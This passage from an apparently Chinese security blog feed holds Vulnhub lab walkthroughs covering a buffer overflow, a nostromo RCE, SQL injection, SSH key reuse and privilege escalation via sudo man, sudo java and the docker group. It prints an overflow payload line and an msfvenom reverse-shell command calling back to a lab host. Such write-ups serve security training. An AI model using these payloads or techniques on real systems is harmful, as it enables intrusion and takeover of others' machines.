<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">buffer = <span class="string">"A"</span> * <span class="number">524</span> + <span class="string">"\xf3\x12\x17\x31"</span> +<span class="string">"\x90"</span> * <span class="number">16</span> + buf</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/Screenshot_20200625_125802.jpg" alt=""><br>此时正确接收到反弹回来的shell。</p>
<p>靶机是Linux系统，所以要修改shellcode。重新使用msf生成shellcode</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux&#x2F;x86&#x2F;shell_reverse_tcp LPORT&#x3D;4444 LHOST&#x3D;192.168.56.10 -f python -b &quot;\x00&quot;</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200625_131641.jpg" alt=""></p>
<p>成功反弹shell！</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><hr>

<p>进行信息收集…..</p>
<hr>

<p>执行sudo -l后，发现当前用户可以无密码执行/home/anansi/bin/anansi_util程序<br><img src="https://images.atsud0.me/images/post/Screenshot_20200625_132617.jpg" alt=""></p>
<p>依次执行看了一下，分别是</p>
<ul>
<li>ip a/ipconfig 命令</li>
<li>top</li>
<li>man</li>
</ul>
<p><a href="https://gtfobins.github.io/gtfobins/man/" target="_blank" rel="noopener">sudo man</a>能够提权，所以就利用它了。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200625_132838.jpg" alt=""></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这是我遇到的第一个缓冲区溢出的靶机，让我重新学习了一波缓冲区溢出。感觉不是很难??获益良多。</p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>Vulnhub</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Buffer Overflow</tag>
        <tag>GTFOBins-man</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub-my-web-server</title>
    <url>/2020/07/04/Vulnhub-my-web-server/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>无聊打的一个靶机</p>
<p>需要修改dns为:</p>
<ul>
<li>靶机IP <a href="http://www.armour.local" target="_blank" rel="noopener">www.armour.local</a></li>
</ul>
<a id="more"></a>

<p>nmap扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ bash &#x2F;data&#x2F;Code&#x2F;shell&#x2F;nmap_quick.sh 192.168.56.4</span><br><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-07-03 00:22 CST</span><br><span class="line">Nmap scan report for 192.168.56.4</span><br><span class="line">Host is up (0.00030s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 cd:dc:8f:24:51:73:54:bc:87:62:a2:e6:ed:f1:c1:b4 (RSA)</span><br><span class="line">|   256 a9:39:a9:bf:b2:f7:01:22:65:07:be:15:48:e8:ef:11 (ECDSA)</span><br><span class="line">|_  256 77:f5:a9:ff:a6:44:7c:9c:34:41:f1:ec:73:5e:57:bd (ED25519)</span><br><span class="line">80&#x2F;tcp   open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-generator: WordPress 5.3.2</span><br><span class="line">| http-robots.txt: 1 disallowed entry</span><br><span class="line">|_&#x2F;wp-admin&#x2F;</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.38 (Debian)</span><br><span class="line">|_http-title: Armour &amp;#8211; Just another WordPress site</span><br><span class="line">2222&#x2F;tcp open  http    nostromo 1.9.6</span><br><span class="line">|_http-server-header: nostromo 1.9.6</span><br><span class="line">|_http-title: Radius by TEMPLATED</span><br><span class="line">3306&#x2F;tcp open  mysql   MySQL (unauthorized)</span><br><span class="line">8009&#x2F;tcp open  ajp13   Apache Jserv (Protocol v1.3)</span><br><span class="line">|_ajp-methods: Failed to get a valid response for the OPTION request</span><br><span class="line">8080&#x2F;tcp open  http    Apache Tomcat&#x2F;Coyote JSP engine 1.1</span><br><span class="line">|_http-favicon: Apache Tomcat</span><br><span class="line">|_http-server-header: Apache-Coyote&#x2F;1.1</span><br><span class="line">|_http-title: Apache Tomcat&#x2F;8.0.33</span><br><span class="line">8081&#x2F;tcp open  http    nginx 1.14.2</span><br><span class="line">|_http-server-header: nginx&#x2F;1.14.2</span><br><span class="line">|_http-title: Visualize by TEMPLATED</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/Screenshot_20200704_134547.jpg" alt=""><br>发现nostromo 1.9.6有一个远程代码执行的漏洞，直接利用exp<br><img src="https://images.atsud0.me/images/post/Screenshot_20200704_134806.jpg" alt=""><br>获得初步shell。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200704_134906.jpg" alt=""></p>
<p>然后在tomcat的目录下发现用户名和密码，登录到管理面板上传shell 水平提权到tomcat<br>sudo -l 后tomcat用户可以sudo java。所以直接msf继续生成个jar，sudo java -jar shell.jar 获得root权限<br><img src="https://images.atsud0.me/images/post/Screenshot_20200704_135118.jpg" alt=""></p>
<p>想起服务器上面8080端口还运行了一个tomcat，也许可以利用一下。tomcat用户密码默认配置文件<code>/usr/local/tomcat/conf/tomcat-users.xml</code><br><img src="https://images.atsud0.me/images/post/Screenshot_20200704_135209.jpg" alt=""><br><img src="https://images.atsud0.me/images/post/Screenshot_20200704_135311.jpg" alt=""></p>
<p>生成war木马，在管理面板部署后开启监听访问。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200704_135938.jpg" alt=""><br>tomcat 用户可以sudo运行java<br><img src="https://images.atsud0.me/images/post/Screenshot_20200704_140647.jpg" alt=""></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200704_140852.jpg" alt=""><br><img src="https://images.atsud0.me/images/post/Screenshot_20200703_013340.jpg" alt=""></p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>Vulnhub</category>
      </categories>
      <tags>
        <tag>tomcat</tag>
        <tag>sudo java</tag>
        <tag>nostromo 1.9.6</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub-pinkys-palace-1</title>
    <url>/2020/08/29/Vulnhub-pinkys-palace-1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>摸了很久。</p>
<a id="more"></a>

<h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><h3 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ nmap -T5 -p- -sC -sV 192.168.56.7</span><br><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-07-25 15:26 CST</span><br><span class="line">Nmap scan report for 192.168.56.7</span><br><span class="line">Host is up (0.00030s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT      STATE SERVICE    VERSION</span><br><span class="line">8080&#x2F;tcp  open  http       nginx 1.10.3</span><br><span class="line">|_http-server-header: nginx&#x2F;1.10.3</span><br><span class="line">|_http-title: 403 Forbidden</span><br><span class="line">31337&#x2F;tcp open  http-proxy Squid http proxy 3.5.23</span><br><span class="line">|_http-server-header: squid&#x2F;3.5.23</span><br><span class="line">|_http-title: ERROR: The requested URL could not be retrieved</span><br><span class="line">64666&#x2F;tcp open  ssh        OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 df:02:12:4f:4c:6d:50:27:6a:84:e9:0e:5b:65:bf:a0 (RSA)</span><br><span class="line">|   256 0a:ad:aa:c7:16:f7:15:07:f0:a8:50:23:17:f3:1c:2e (ECDSA)</span><br><span class="line">|_  256 4a:2d:e5:d8:ee:69:61:55:bb:db:af:29:4e:54:52:2f (ED25519)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 29.36 seconds</span><br></pre></td></tr></table></figure>

<p>http端口直接访问的话是403，就算设置了靶机的代理直接访问也是403。</p>
<p>这里如果仔细观察<br><img src="https://images.atsud0.me/images/post/Screenshot_20200811_204856.jpg" alt=""></p>
<p>会发现有个By pinkys-palace，尝试将这个作为域名解析访问。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'192.168.56.7 pinkys-palace'</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>

<p>此时再通过靶机http代理访问8080就不是403了。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200811_205417.jpg" alt=""></p>
<p>扫描结果<br><img src="https://images.atsud0.me/images/post/Screenshot_20200811_210341.jpg" alt=""></p>
<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><p>访问<a href="http://pinkys-palace:8080/littlesecrets-main/" target="_blank" rel="noopener">http://pinkys-palace:8080/littlesecrets-main/</a></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200811_210752.jpg" alt=""></p>
<p>有一个登录界面，但是手注注不出来，访问logs.php后，发现有user-agent列，</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200811_210859.jpg" alt=""></p>
<p>猜测应该是这里头部注入了，直接用sqlmap跑了。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200811_212235.jpg" alt=""></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200811_212400.jpg" alt=""></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200811_212419.jpg" alt=""></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200811_212515.jpg" alt=""></p>
<p>解密得<br><img src="https://images.atsud0.me/images/post/Screenshot_20200811_212731.jpg" alt=""></p>
<p>无论如何都还是登录不进去- -。。不过还是有个ssh可以试试</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200811_212939.jpg" alt=""></p>
<p>登录成功！</p>
<p>去网站根目录搜索后，发现还有一个隐藏目录。看备注提示，这应该是个id_rsa的密钥文件。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200811_213103.jpg" alt=""></p>
<p>顺利越权至pinky<br><img src="https://images.atsud0.me/images/post/Screenshot_20200811_213351.jpg" alt=""></p>
<p>又到了我最不拿手的逆向环节了:(<br><img src="https://images.atsud0.me/images/post/Screenshot_20200811_213521.jpg" alt=""></p>
<p>gdb 进入调试程序后，看下函数。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200811_223305.jpg" alt=""></p>
<p><a href="https://suchprogramming.com/new-linux-process-c/" target="_blank" rel="noopener">Spawning New Linux Processes in C</a></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200811_223247.jpg" alt=""></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200811_223654.jpg" alt=""></p>
<p>经过多番努力，终于在gdb中跳转到了spawn(其实就是菜拉)<br><img src="https://images.atsud0.me/images/post/Screenshot_20200811_221723.jpg" alt=""></p>
<p>现在关键是怎么在shell中跳转到这个函数了。<br><img src="https://images.atsud0.me/images/post/image-pinky-1.png" alt=""></p>
<p>提权至root<br><img src="https://images.atsud0.me/images/post/images-blog-pinky-2.png" alt=""></p>
<blockquote>
<p>d047555555内存地址是spawn函数的起始内存地址。</p>
</blockquote>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>Vulnhub</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub-pwned</title>
    <url>/2020/07/21/Vulnhub-pwned/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><ul>
<li><a href="https://www.vulnhub.com/entry/pwned-1,507/" target="_blank" rel="noopener">靶机下载链接:Pwned</a></li>
</ul>
<a id="more"></a>


<h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><h3 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ nmap -T5 -p- -sV -sC 192.168.56.3</span><br><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-07-21 17:21 CST</span><br><span class="line">Nmap scan report for 192.168.56.3</span><br><span class="line">Host is up (0.0014s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21&#x2F;tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 fe:cd:90:19:74:91:ae:f5:64:a8:a5:e8:6f:6e:ef:7e (RSA)</span><br><span class="line">|   256 81:32:93:bd:ed:9b:e7:98:af:25:06:79:5f:de:91:5d (ECDSA)</span><br><span class="line">|_  256 dd:72:74:5d:4d:2d:a3:62:3e:81:af:09:51:e0:14:4a (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.38 (Debian)</span><br><span class="line">|_http-title: Pwned....!!</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure>

<h4 id="分析攻击面"><a href="#分析攻击面" class="headerlink" title="分析攻击面"></a>分析攻击面</h4><ul>
<li>21端口，用nmap探测不允许匿名用户登录，就不去手试了。</li>
<li>22 ssh ，没有线索的话，只能爆破。</li>
<li>80 21，22没有线索估计也只能在http上找线索</li>
</ul>
<h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ gobuster dir -u http:&#x2F;&#x2F;192.168.56.3&#x2F; -w &#x2F;usr&#x2F;share&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt    </span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">[+] Url:            http:&#x2F;&#x2F;192.168.56.3&#x2F;</span><br><span class="line">[+] Threads:        10</span><br><span class="line">[+] Wordlist:       &#x2F;usr&#x2F;share&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster&#x2F;3.0.1</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2020&#x2F;07&#x2F;21 17:22:44 Starting gobuster</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x2F;nothing (Status: 301)</span><br><span class="line">&#x2F;server-status (Status: 403)</span><br><span class="line">&#x2F;hidden_text (Status: 301)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2020&#x2F;07&#x2F;21 17:23:29 Finished</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<p><code>/nothing</code>是真的没有什么东西，作者没有骗人。<br><code>hidden_text</code>下面有一个secret.dic，下载下来一看，是些路径。恩，应该是目录字典。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ gobuster dir -u http:&#x2F;&#x2F;192.168.56.3&#x2F; -w .&#x2F;secret.dic                                      </span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">[+] Url:            http:&#x2F;&#x2F;192.168.56.3&#x2F;</span><br><span class="line">[+] Threads:        10</span><br><span class="line">[+] Wordlist:       .&#x2F;secret.dic</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster&#x2F;3.0.1</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2020&#x2F;07&#x2F;21 17:24:22 Starting gobuster</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x2F;pwned.vuln (Status: 301)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2020&#x2F;07&#x2F;21 17:24:22 Finished</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>


<p>访问这个路径:<br><img src="https://images.atsud0.me/images/post/Screenshot_20200721_194351.jpg" alt=""></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200721_194431.jpg" alt=""></p>
<p>嗯哼，有ftp的帐号密码了。</p>
<h3 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ftp 192.168.56.3</span><br><span class="line">Connected to 192.168.56.3.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (192.168.56.3:vkk): ftpuser</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password: </span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">drwxr-xr-x    2 0        0            4096 Jul 10 12:47 share</span><br><span class="line"></span><br><span class="line">ftp&gt; cd share</span><br><span class="line">250 Directory successfully changed.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">-rw-r--r--    1 0        0            2602 Jul 09 15:05 id_rsa</span><br><span class="line">-rw-r--r--    1 0        0              75 Jul 09 17:41 note.txt</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; get id_rsa</span><br><span class="line"></span><br><span class="line">ftp&gt; get note.txt</span><br><span class="line"></span><br><span class="line">ftp&gt; quit</span><br><span class="line">221 Goodbye.</span><br></pre></td></tr></table></figure>

<p>这里下载的两个文件，都可能会在后续的流程中用到。</p>
<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><p>下载到ssh私钥后，给600/400权限，但是不知道该私钥的用户名，不过通过查看note.txt后，可以看到一个英文名字。直接使用这个英文名作为用户名尝试登录。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod 600 id_rsa</span><br><span class="line"></span><br><span class="line">cat note.txt </span><br><span class="line"></span><br><span class="line">    Wow you are here </span><br><span class="line"></span><br><span class="line">    ariana won&#39;t happy about this note </span><br><span class="line"></span><br><span class="line">    sorry ariana :( </span><br><span class="line"></span><br><span class="line">ssh -i id_rsa ariana@192.168.56.3</span><br></pre></td></tr></table></figure>

<p>登录成功。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200721_203656.jpg" alt=""></p>
<p>看文件权限没有能动手脚的地方。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200721_215326.jpg" alt=""></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200721_215418.jpg" alt=""></p>
<p>这里重点关注</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$msg 2&gt; &#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>

<p>它表示的意思是执行变量msg值的程序，并将这个程序的错误输出重定向到/dev/null中</p>
<blockquote>
<p>后来才和群大佬讨论交流才注意到，一开始误打误撞直接whoami就出结果了，没注意到这里(谢谢dis_大佬的解答</p>
</blockquote>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200721_215850.jpg" alt=""></p>
<h2 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h2><p>docker组成员，直接使用docker组提权。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200721_233827.jpg" alt=""></p>
